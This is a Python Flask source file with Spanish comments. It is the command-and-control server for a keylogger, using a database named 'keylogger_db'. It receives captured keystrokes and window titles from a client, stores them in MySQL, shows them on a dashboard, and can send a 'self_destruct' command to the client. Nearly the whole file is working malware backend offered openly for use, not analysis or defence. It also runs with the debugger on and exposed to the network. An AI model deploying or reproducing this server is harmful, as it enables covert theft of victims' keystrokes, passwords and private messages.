from flask import Flask, request, jsonify, render_template
import pymysql
from flask_cors import CORS
import datetime

# Inicializar Flask
app = Flask(__name__)
CORS(app)  # Permite conexiones cruzadas (necesario para evitar errores de bloqueos)

# --- ⚙️ CONFIGURACIÓN DE LA BASE DE DATOS ⚙️ ---
# CAMBIA ESTO CON TUS DATOS REALES
DB_HOST = "localhost"
DB_USER = "root"
DB_PASSWORD = "aca tu contraseña"  # <--- ¡IMPORTANTE! PON TU CONTRASEÑA AQUÍ
DB_NAME = "keylogger_db"

# --- 💀 VARIABLE DE CONTROL (KILL SWITCH) 💀 ---
# Si esto es True, el servidor ordenará al cliente borrarse
KILL_CLIENT = False

def get_db_connection():
    """Crea la conexión a MySQL."""
    connection = pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME,
        cursorclass=pymysql.cursors.DictCursor,
        connect_timeout=10
    )
    return connection

# ==========================================
#  RUTAS DEL DASHBOARD (WEB)
# ==========================================

@app.route('/')
def index():
    """
    Renderiza el panel de control HTML.
    IMPORTANTE: dashboard.html debe estar en la carpeta 'templates'.
    """
    try:
        return render_template('dashboard.html')
    except Exception as e:
        return f"<h1>Error: No se encuentra el archivo HTML</h1><p>Asegúrate de que existe la carpeta <b>server/templates/</b> y dentro está <b>dashboard.html</b>.</p><p>Error detallado: {e}</p>"

@app.route('/api/get_logs', methods=['GET'])
def get_logs():
    """API que consume el dashboard para actualizar la tabla."""
    connection = None
    try:
        connection = get_db_connection()
        connection.ping(reconnect=True) # Asegurar conexión viva
        with connection.cursor() as cursor:
            # Traer los últimos 100 registros
            sql = "SELECT id, window_title, keystrokes, timestamp FROM logs ORDER BY timestamp DESC LIMIT 100"
            cursor.execute(sql)
            result = cursor.fetchall()
        return jsonify(result), 200
    except Exception as e:
        print(f"❌ Error leyendo logs: {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        if connection:
            connection.close()

@app.route('/api/kill_toggle', methods=['POST'])
def toggle_kill():
    """Botón rojo: Activa la orden de autodestrucción."""
    global KILL_CLIENT
    KILL_CLIENT = True
    print("⚠️ [ALERTA] ORDEN DE AUTODESTRUCCIÓN ACTIVADA")
    return jsonify({"status": "active", "message": "Orden de autodestrucción activada"}), 200

# ==========================================
#  RUTAS DEL KEYLOGGER (CLIENTE)
# ==========================================

@app.route('/log', methods=['POST'])
def receive_log():
    """Recibe los datos del cliente y responde con comandos."""
    global KILL_CLIENT
    
    # 1. Validar datos entrantes
    data = request.get_json(silent=True) # silent=True evita error 500 si el JSON está mal
    if not data or 'window_title' not in data or 'keystrokes' not in data:
        return jsonify({"status": "error", "message": "Datos inválidos o vacíos"}), 400

    window_title = data['window_title']
    keystrokes = data['keystrokes']

    print(f"📥 Recibido log de: {window_title[:20]}...") # Log en consola del servidor

    connection = None
    try:
        # 2. Guardar en Base de Datos
        connection = get_db_connection()
        connection.ping(reconnect=True) # Si la conexión se cayó, la levanta de nuevo
        
        with connection.cursor() as cursor:
            sql = "INSERT INTO logs (window_title, keystrokes) VALUES (%s, %s)"
            cursor.execute(sql, (window_title, keystrokes))
        connection.commit()
        
        # 3. Preparar respuesta (Comandos)
        response_data = {"status": "success"}
        
        if KILL_CLIENT:
            response_data["command"] = "self_destruct"
            print("🚀 ENVIANDO COMANDO DE DESTRUCCIÓN AL CLIENTE")
            
        return jsonify(response_data), 201
        
    except Exception as e:
        print(f"❌ Error al guardar en BD: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        if connection:
            connection.close()

if __name__ == '__main__':
    # host='0.0.0.0' hace que el servidor sea visible en tu red local
    print("🟢 Servidor iniciado en puerto 5000...")
    app.run(host='0.0.0.0', port=5000, debug=True)
